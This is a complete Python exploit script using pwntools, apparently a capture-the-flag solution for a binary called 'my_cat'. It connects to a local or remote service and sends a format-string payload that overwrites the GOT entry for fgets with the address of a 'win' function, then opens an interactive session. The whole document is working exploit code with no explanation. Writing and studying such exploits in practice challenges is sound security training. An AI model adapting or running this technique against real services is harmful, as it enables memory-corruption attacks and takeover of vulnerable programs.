#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF(args.EXE or '../pub/my_cat')

host = args.HOST or '127.0.0.1'
port = int(args.PORT or 10001)

def start_local(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io)
    return io

def start(argv=[], *a, **kw):
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

io = start()

io.recvrepeat(1)
payload = fmtstr_payload(8, {exe.got.fgets : exe.symbols.win})
io.sendline(payload)

io.interactive()